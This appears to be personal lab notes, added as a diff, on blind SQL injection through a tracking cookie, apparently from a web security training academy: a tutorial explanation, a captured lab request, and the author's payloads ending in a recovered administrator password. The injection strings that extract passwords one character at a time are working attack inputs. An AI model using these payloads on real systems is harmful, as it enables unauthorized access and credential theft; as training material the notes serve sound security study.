@@ -1,0 +1,73 @@
+Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
+
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.
+
+This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
+
+To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
+
+…xyz' AND '1'='1
+…xyz' AND '1'='2
+
+The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
+The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
+This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
+
+For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+
+
+To do this, start with the following input:
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.
+
+Next, we send the following input:
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.
+
+Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:
+
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+We can continue this process to systematically determine the full password for the Administrator user.
+
+
+org req :-
+
+GET /filter?category=Gifts HTTP/2
+Host: 0a48008903bb1d3481273eb20038006b.web-security-academy.net
+Cookie: TrackingId=iz6QQMDvbITPxvft; session=NbsrWhuWgPEDfvT7MsIsPPIBSCKROJ12
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a48008903bb1d3481273eb20038006b.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+
+steps :-
+
+' AND '1'='1
+' AND '1'='2
+
+' AND (SELECT 'a' FROM users LIMIT 1)='a
+' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='g
+' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='n
+
+
+final password :-
+gnn9w7gga89ds685ephk
